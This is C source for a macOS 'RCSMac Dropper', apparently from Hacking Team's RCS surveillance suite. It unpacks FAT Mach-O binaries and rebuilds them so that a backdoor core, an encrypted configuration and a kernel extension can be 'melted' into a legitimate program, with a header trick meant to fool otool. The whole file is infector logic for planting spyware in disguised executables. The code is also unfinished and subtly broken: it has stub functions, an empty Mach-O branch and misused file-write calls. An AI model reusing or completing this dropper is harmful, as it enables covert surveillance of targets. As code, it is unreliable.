/*
 * RCSMac Dropper
 *  - Check if the input file is a FAT binary
 *    - If Yes Unpack every single ARCH
 *  - Rebuild a FAT binary with all the original archs
 *    - Add a new ARCH PPC7400(?) which will be pointing to our data
 *    - Fool otool by adding data at the start of the Mach_Header (InfectionHeader)
 *
 * Created by Alfredo 'revenge' Pesoli on 14/07/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

//#include <libc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/stat.h>
//#include <sys/mman.h>

#include "RCSMacDropper.h"

#define MACH_MAGIC  0xfeedface
#define FAT_MAGIC	  0xcafebabe

#define PAGE_ALIGNMENT 0x1000

#define VERSION     0.2


int
infectBinary (int aBinaryType)
{
  struct fatHeader newFatHeader;
  struct fatArch newFatArch;
  int outputFD;

  struct stat sb;

  unsigned int outOffset = 0;
  unsigned long architectureOffset = 0;
  unsigned long tempArchOffset     = 0;
  unsigned long paddedArchOffset   = 0;

  //
  // Crete the output file
  //
  if ((outputFD = open (gOutputFile, O_RDWR | O_CREAT | O_TRUNC, 0644)) < 0)
    {
      return kErrorCreateFile;
    }

  //if (!(outputFD = fopen (gOutputFile, "wb")))
    //{
      //return kErrorCreateFile;
    //}

  if (stat (gInputFile, &sb) == kErrorGeneric)
    {
      return kErrorGeneric;
    }

  int filesize = sb.st_size;
  char *outputMappedFile;
  
  //
  // Now mmap it, better and portable
  //
  if ((int)(outputMappedFile = mmap (0, filesize, PROT_READ | PROT_WRITE, 
                                     MAP_SHARED, outputFD, 0)) == kErrorGeneric)
    {
      printf ("[ee] Error during the mmapping of the output file\n");
      
      return kErrorCreateFile;
    }

  if (lseek (outputFD, filesize - 1, SEEK_SET) == kErrorGeneric)
    return kErrorOpenFile;
  if (write (outputFD, "", 1) == kErrorGeneric)
    return kErrorWriteFile;

  int index = 0;

  // No swap required
  if (aBinaryType & kFatBinary)
    {
      int numberOfArchs = gFatHeader.nfatArch;

      //
      // Setting up the new FAT Header by adding one new architecture
      //
      newFatHeader.magic    = FAT_MAGIC;
      newFatHeader.nfatArch = numberOfArchs;

      //
      // Storing the new FAT Header
      //
      fwrite (&newFatHeader, sizeof (newFatHeader), 1, outputFD);

      resourceHeader *resourceEntry[numberOfArchs];

      unsigned long dataOffset[6];
      int i;

      printf("[ii] Unpacking Fat Binary\n"); 
      printf("[ii] Found %d Arch(s)\n", numberOfArchs);

      //
      // Recreate the FAT header + FAT Archs
      //
      for (i=0; i<numberOfArchs; i++)
        {
          if (fread (&gFatArch, 1, 
                     sizeof (gFatArch), gInputFD) != sizeof (gFatArch))
            return kErrorReadFile;

          if (fseek (gInputFD, gFatArch.offset, SEEK_SET) == kErrorGeneric)
            {
              void *filePointer = malloc (gFatArch.size);
              memset (filePointer, '\0', gFatArch.size);
              
              if (filePointer != NULL)
                {
                  fread (filePointer, gFatArch.size, 1, gInputFD);

                  struct mach_header *m_header;
                  m_header = malloc (sizeof (struct mach_header));
                  memset (m_header, '\0', sizeof (struct mach_header));
                  memcpy (m_header, filePointer, sizeof (struct mach_header));

                  if (m_header->magic != MH_MAGIC)
                    {
                      return kInvalidMacho;
                    }

                  architectureOffset = (sizeof (newFatArch) *
                                        newFatHeader.nfatArch) +
                                        sizeof (newFatHeader);

                  // Now pad the offset to page boundary
                  architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1)
                                        * PAGE_ALIGNMENT;

                  //
                  // Setting up the fatArch header
                  //
                  newFatArch.cputype    = m_header->cputype;
                  newFatArch.cpusubtype = m_header->cpusubtype;
                  newFatArch.offset     = architectureOffset;
                  newFatArch.size       = gFatArch.size;
                  newFatArch.align      = 0xD;

                  architectureOffset += gFatArch.size;
                  // Now pad the offset to page boundary
                  architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1)
                                        * PAGE_ALIGNMENT;

                  if (fwrite (&newFatArch, sizeof (newFatArch), 1, outputFD) !=
                      sizeof (newFatArch))
                    {
                      return kErrorWriteFile;
                    }
                  
                  printf("filePointer: %08x", filePointer);
                  printf("filePointer: %08x", *(unsigned long *)filePointer);
                  dataOffset[~(numberOfArchs - gFatHeader.nfatArch - 1)] = *(unsigned long *)filePointer;
                }

              return kErrorGeneric;
            }
        }

      numberOfArchs = gFatHeader.nfatArch;

      //
      // Now copy back all the mach blocks
      //
      for (i=0; i<gFatHeader.nfatArch; i++)
        {
          tempArchOffset = architectureOffset = ftell (outputFD);
          architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1) *
                                PAGE_ALIGNMENT;

          while (tempArchOffset < architectureOffset)
            {
              fwrite ('\x00', 1, 1, outputFD);
              tempArchOffset++;
            }

          //if (fseek (gInputFD, offset, SEEK_SET) == kErrorGeneric)

        }

    }
  else if (aBinaryType & kFatSwapBinary)
    {
      printf("[ii] Infecting Swap Fat Binary\n");
      gFatHeader.nfatArch = SWAP_LONG (gFatHeader.nfatArch);
      int numberOfArchs = gFatHeader.nfatArch;

      //
      // Setting up the new FAT Header by adding one new architecture
      //
      newFatHeader.magic    = FAT_CIGAM;
      newFatHeader.nfatArch = SWAP_LONG (numberOfArchs - 1); //+ 1);

      //
      // Storing the new FAT Header
      //
      memcpy (outputMappedFile, &newFatHeader, sizeof (newFatHeader));
      outOffset += sizeof (newFatHeader);
      //fwrite (&newFatHeader, sizeof (newFatHeader), 1, outputFD);
      resourceHeader *resourceEntry[numberOfArchs];

      unsigned long dataOffset[6];
      int i;

      printf("[ii] Unpacking Fat Binary\n"); 
      printf("[ii] Found %d Arch(s)\n", numberOfArchs);

      //
      // Recreate the FAT header + FAT Archs
      //
      for (i=0; i<numberOfArchs; i++)
        {
          if (fread (&gFatArch, 1, 
                     sizeof (gFatArch), gInputFD) != sizeof (gFatArch))
            return kErrorReadFile;

          gFatArch.cputype = SWAP_LONG (gFatArch.cputype);
          gFatArch.cpusubtype = SWAP_LONG (gFatArch.cpusubtype);
          gFatArch.offset = SWAP_LONG (gFatArch.offset);
          gFatArch.size = SWAP_LONG (gFatArch.size);
          gFatArch.align = SWAP_LONG (gFatArch.align);
#ifdef DEBUG
					printf("[ii] cputype \t: %d\n", gFatArch.cputype);
					printf("[ii] offset \t\t: %u\n", (unsigned long)gFatArch.offset);
					printf("[ii] size \t\t: %d\n", gFatArch.size);
#endif

          int tmpOfft = ftell (gInputFD);

          if (fseek (gInputFD, gFatArch.offset, SEEK_SET) == kErrorGeneric)
            {
              printf ("Error on fseek\n");
              return kErrorGeneric;
            }
#ifdef DEBUG
          printf ("[ii] fseek to the architecture offset\n");
#endif
          void *filePointer = malloc (gFatArch.size);
          memset (filePointer, '\0', gFatArch.size);
          
          if (filePointer != NULL)
            {
              printf ("[ii] Reading the architecture data\n");
              fread (filePointer, gFatArch.size, 1, gInputFD);

              printf("[ii] filePointer: %08x\n", filePointer);

              struct mach_header m_header;
              memset (&m_header, '\0', sizeof (struct mach_header));
              memcpy (&m_header, filePointer, sizeof (struct mach_header));

              //m_header.magic = SWAP_LONG (m_header.magic);
              //m_header.cputype = SWAP_LONG (m_header.cputype);
              //m_header.cpusubtype = SWAP_LONG (m_header.cpusubtype);
              //m_header.filetype = SWAP_LONG (m_header.filetype);
              //m_header.ncmds = SWAP_LONG (m_header.ncmds);
              //m_header.sizeofcmds = SWAP_LONG (m_header.sizeofcmds);
              //m_header.flags = SWAP_LONG (m_header.flags);
#ifdef DEBUG
              printf ("[ii] m_header magic: 0x%08x\n", m_header.magic);
              printf ("[ii] m_header cpu_type: %u\n", m_header.cputype);
              printf ("[ii] m_header cpu_type: %u\n", m_header.cputype);
#endif
              architectureOffset = (sizeof (newFatArch) *
                                    newFatHeader.nfatArch) +
                                    sizeof (newFatHeader);

              // Now pad the offset to page boundary
              architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1)
                                    * PAGE_ALIGNMENT;

              //
              // Setting up the fatArch header
              //
              if (m_header.magic == MH_MAGIC)
                {
                  newFatArch.cputype    = SWAP_LONG (m_header.cputype);
                  newFatArch.cpusubtype = SWAP_LONG (m_header.cpusubtype);
                }
              else if (m_header.magic == MH_CIGAM)
                {
                  newFatArch.cputype    = m_header.cputype;
                  newFatArch.cpusubtype = m_header.cpusubtype;
                }

              newFatArch.offset     = SWAP_LONG (gFatArch.offset);
              newFatArch.size       = SWAP_LONG (gFatArch.size);
              newFatArch.align      = SWAP_LONG (gFatArch.align);
              unsigned long t = 0xD;

              architectureOffset += gFatArch.size;
              // Now pad the offset to page boundary
              architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1)
                                    * PAGE_ALIGNMENT;

              outOffset += sizeof (gFatArch) * i;

              memcpy (outputMappedFile + outOffset, &newFatArch, sizeof (newFatArch));
              //fwrite (&newFatArch, sizeof (newFatArch), 1, outputFD);
              
              dataOffset[index] = gFatArch.size;
              dataOffset[index + 1] = (unsigned long)filePointer;

              index += 2;

              if (fseek (gInputFD, tmpOfft, SEEK_SET) == kErrorGeneric)
                {
                  return kErrorGeneric;
                }
            }
          else
            printf ("[ee] filePointer is NULL\n");
        }

      outOffset += sizeof (gFatArch);
      printf ("\n[ii] header setted correctly\n\n");
      numberOfArchs = SWAP_LONG (gFatHeader.nfatArch);

      int z;
      
      for (z = 0; z < 3; z += 2)
        {
          printf("dataOffset (%d): size: %d\n", z, dataOffset[z]);
          printf("dataOffset (%d): pointer 0x%x\n", z, dataOffset[z + 1]);
          printf("dataOffset (%d) first dword %x\n", z, *(unsigned long *)(dataOffset[z + 1] + 0x4));
        }
      
      //
      // Now copy back all the mach blocks
      //
      int index = 0;
      
      for (i=0; i<gFatHeader.nfatArch; i++)
        {
          printf("[ii] i: %d\n", i);
          tempArchOffset = architectureOffset = outOffset;
          architectureOffset = (architectureOffset / PAGE_ALIGNMENT + 1) *
                                PAGE_ALIGNMENT;
#ifdef DEBUG
          printf("[ii] outOffset: 0x%x\n", outOffset);
          printf("[ii] tempArchOffset: %d\n", tempArchOffset);
          printf("[ii] architectureOffset: %d\n", architectureOffset);
#endif
          char zero = '\x00';

          //memset (outputMappedFile + outOffset, '\x00', architectureOffset - outOffset);
          //while (tempArchOffset < architectureOffset)
            //{
              //fwrite (&zero, 1, 1, outputFD);
              //tempArchOffset++;
            //}

          outOffset = architectureOffset;

          printf ("[ii] Padded with 0\n");
          int size = 0;
          int finalSize = dataOffset[index];
          unsigned long dataPointer = dataOffset[++index];

          printf("[ii] dataPointer: %x\n", dataPointer);
          
          memcpy (outputMappedFile + outOffset, (unsigned long *)dataPointer, finalSize);
          free ((unsigned long *)dataPointer);
          index++;
          
          //while (size < finalSize)
            //{
              //size = fwrite ((unsigned long *)dataPointer, 1, finalSize, outputFD);
            //}

          //if (fseek (gInputFD, offset, SEEK_SET) == kErrorGeneric)
            //return kErrorGeneric;
          
          outOffset += finalSize;
        }
    }
  else if (aBinaryType & kMachBinary)
    {

    }

  return kSuccess;
}

int
repackBinaries ()
{
  return kSuccess;
}

int
getBinaryFormat ()
{
  if (!(gInputFD = fopen (gInputFile, "rb")))
    {
      return kErrorOpenFile;
    }

  if (fread (&gFatHeader, 1, sizeof (gFatHeader), gInputFD) != sizeof (gFatHeader))
    {
      return kErrorReadFile;
    }

  printf("file Read\n");

  switch (gFatHeader.magic)
    {
    case FAT_CIGAM:
      {
        return kFatSwapBinary;
      }
    case FAT_MAGIC:
      {
        return kFatBinary;
      }
    default:
      return kMachBinary;
    }
}

void
usage (char *aBinaryName)
{
  printf ("\nUsage: %s <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
  printf ("\t<core>   : backdoor core\n");
  printf ("\t<conf>   : backdoor encrypted configuration\n");
  printf ("\t<kext>   : kernel extension\n");
  printf ("\t<path>   : backdoor installation path (on target)\n");
  printf ("\t<input>  : binary to melt with\n");
  printf ("\t<output> : output filename\n\n");
}

int
parseArguments (int argc, char **argv)
{
	if (argc != 7)
    {
      return -1;
    }

  gCore = argv[1];
  gConfiguration = argv[2];

  if (strncmp ("null", argv[3], strlen ("null")) != 0)
    gKext = argv[3];

  gInstallPath  = argv[4];
  gInputFile    = argv[5];
  gOutputFile   = argv[6];

  return kSuccess;
}

int
main (int argc, char **argv)
{	
  if (parseArguments (argc, argv) & kErrorGeneric )
    {
      usage (*argv);
      exit (1);
    }

  int fileType = getBinaryFormat ();

  switch (fileType)
    {
    case kFatBinary:
      {
        printf ("[ii] FAT Binary found\n");
        infectBinary (kFatBinary);

        break;
      }
    case kFatSwapBinary:
      {
        printf ("[ii] FAT (to Swap) Binary found\n");
        int success;

        if ((success = infectBinary (kFatSwapBinary)) != kSuccess)
          {
            printf("[ee] An error occurred while infecting the binary\n");

            switch (success)
              {
              case kErrorGeneric:
                printf("[ee] Got a generic error\n");
                break;
              case kErrorOpenFile:
                printf("[ee] Error on file open\n");
                break;
              case kErrorReadFile:
                printf("[ee] Error while reading the input file\n");
                break;
              case kErrorWriteFile:
                printf("[ee] Error while writing the output file\n");
                break;
              case kErrorCreateFile:
                printf("[ee] Error while creating the output file\n");
                break;
              default:
                break;
              }
          }
        
        break;
      }
    case kMachBinary:
      {
        printf ("[ii] Mach Binary found\n");
        infectBinary (kMachBinary);
        
        break;
      }
    }

  return kSuccess;
}

